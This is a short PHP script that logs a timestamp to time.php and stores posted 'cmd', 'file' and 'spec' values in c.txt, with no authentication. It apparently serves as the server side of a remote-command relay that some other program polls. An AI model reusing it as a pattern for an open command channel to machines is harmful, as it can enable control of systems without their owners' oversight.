<?php
file_put_contents("time.php", time()."\nEND");
$post = $_POST['cmd'];
$file = $_POST['file'];
$spec = $_POST['spec'];
if(!empty($spec)){
file_put_contents("c.txt", ""."\n".""."\n".$spec);}
else{
file_put_contents("c.txt", $post."\n".$file."\n".$spec);}
?>
